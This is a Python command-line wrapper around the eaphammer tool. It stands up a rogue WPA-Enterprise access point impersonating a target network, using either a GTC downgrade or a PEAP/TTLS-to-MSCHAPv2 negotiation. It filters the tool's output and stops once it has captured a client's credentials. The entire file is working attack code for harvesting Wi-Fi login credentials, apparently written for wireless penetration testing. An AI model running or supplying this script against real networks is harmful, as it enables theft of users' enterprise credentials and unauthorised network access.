#!/usr/bin/env python3

import argparse
import re
import subprocess
import sys

def parse_args():

    #parse command-line arguments for interface, target, and auth flow.
    parser = argparse.ArgumentParser(
        description="Wrapper for eaphammer that stops on credential capture and filters output"
    )
    parser.add_argument(
        "-a", "--auth-method",
        choices=["gtc", "mschapv2"],
        required=True,
        help="Choose 'gtc' (GTC downgrade) or 'mschapv2' (PEAP→MSCHAPv2)"
    )
    parser.add_argument(
        "-i", "--iface", required=True,
        help="Wireless interface (e.g. wlan1)"
    )
    parser.add_argument(
        "-b", "--bssid", required=True,
        help="Target BSSID"
    )
    parser.add_argument(
        "-c", "--channel", type=int, required=True,
        help="Channel number"
    )
    parser.add_argument(
        "-s", "--ssid", required=True,
        help="SSID to broadcast"
    )
    return parser.parse_args()


def run_eaphammer(args):

    # build the base command arguments
    cmd = [
        "eaphammer",
        "--interface", args.iface,
        "--auth", "wpa-eap",
        "--essid", args.ssid,
        "--bssid", args.bssid,
        "--channel", str(args.channel),
        "--creds",
    ]
    if args.auth_method == "gtc":
        cmd += ["--negotiate", "gtc-downgrade"]
    else:
        cmd += [
            "--negotiate", "manual",
            "--phase-1-methods", "PEAP,TTLS",
            "--phase-2-methods", "MSCHAPV2",
        ]

    # patterns for filtering output
    keep_patterns = [
        re.compile(r"^\[hostapd\] AP starting"),
        re.compile(r'^Using interface .*ssid ".+"'),
        re.compile(r"^wlan\d+: AP-DISABLE"),
    ]
    # detect credential block start
    cred_start_patterns = [
        re.compile(r"^GTC:", re.IGNORECASE),
        re.compile(r"^MSCHAPV2:", re.IGNORECASE),
    ]
    # Iinclude any indented lines following credentials
    cred_block_pattern = re.compile(r"^\s+")

    # spawn the process, merging stdout/stderr
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,
        text=True,
        bufsize=1,
    )

    # scan until credentials
    try:
        for line in proc.stdout:
            if any(p.match(line) for p in cred_start_patterns):
                print(line, end="")
                print(f"[+] Detected {args.auth_method.upper()} credentials, ending the attack")
                proc.stdin.write("\n")
                proc.stdin.flush()
                break
            if any(p.match(line) for p in keep_patterns):
                print(line, end="")
    except KeyboardInterrupt:
        # User pressed Ctrl+C before capture
        print("\n[!] Interrupted by user, ending the attack...", file=sys.stderr)
        try:
            proc.stdin.write("\n")
            proc.stdin.flush()
        except Exception:
            pass
        proc.terminate()
        proc.wait()
        sys.exit(1)

    # print credential body and teardown lines, skip blanks and progress bars
    try:
        for line in proc.stdout:
            if line.strip() == "":
                continue
            if re.match(r"^\s*\d+%.*", line):
                continue
            if any(p.match(line) for p in keep_patterns) or cred_block_pattern.match(line):
                print(line, end="")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user during teardown, forcing exit...", file=sys.stderr)
        proc.terminate()
        proc.wait()
        sys.exit(1)

    proc.wait()
    return proc.returncode


def main():
    args = parse_args()
    exit_code = run_eaphammer(args)
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
